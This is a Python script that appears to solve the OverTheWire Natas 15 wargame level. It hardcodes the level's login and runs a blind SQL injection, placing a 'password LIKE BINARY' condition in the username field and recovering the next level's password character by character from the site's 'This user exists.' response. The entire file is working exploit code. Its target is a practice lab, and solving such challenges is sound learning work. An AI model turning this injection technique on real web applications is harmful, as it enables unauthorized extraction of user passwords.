import requests

session = requests.Session()
session.auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")

occur = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

password = ""

for i in range(64):
    for j in occur:
        data = {"username": "natas16\" AND password LIKE BINARY \"" + password + j + "%"}
        auth = session.post('http://natas15.natas.labs.overthewire.org/index.php', data=data)

        print(password, j)

        if "This user exists." in auth.text:
            print("exists")
            password += j
            print(password)
            break



